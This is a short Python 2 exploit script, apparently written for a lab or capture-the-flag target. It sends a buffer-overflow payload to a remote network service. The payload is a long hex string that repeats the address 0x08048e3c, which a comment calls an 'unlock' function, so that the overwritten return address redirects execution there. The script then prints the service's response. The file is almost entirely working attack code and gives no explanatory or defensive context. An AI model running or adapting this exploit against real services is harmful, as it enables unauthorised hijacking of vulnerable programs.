import socket
import sys
from findport import foundPort


# PORT = 10613

host = sys.argv[1]
skeletonkey = sys.argv[2]
username = sys.argv[3]

# 0x08048e3c unlock
# 3c8e0408
# immediately after unlock is the return address


def bufferoverflow (host):
    attack = '3c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e04083c8e0408'
    attack = attack.decode("hex")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, foundPort))
    s.send(attack)
    overflow = s.recv(1024)
    print(overflow)
    s.close()


bufferoverflow(host)
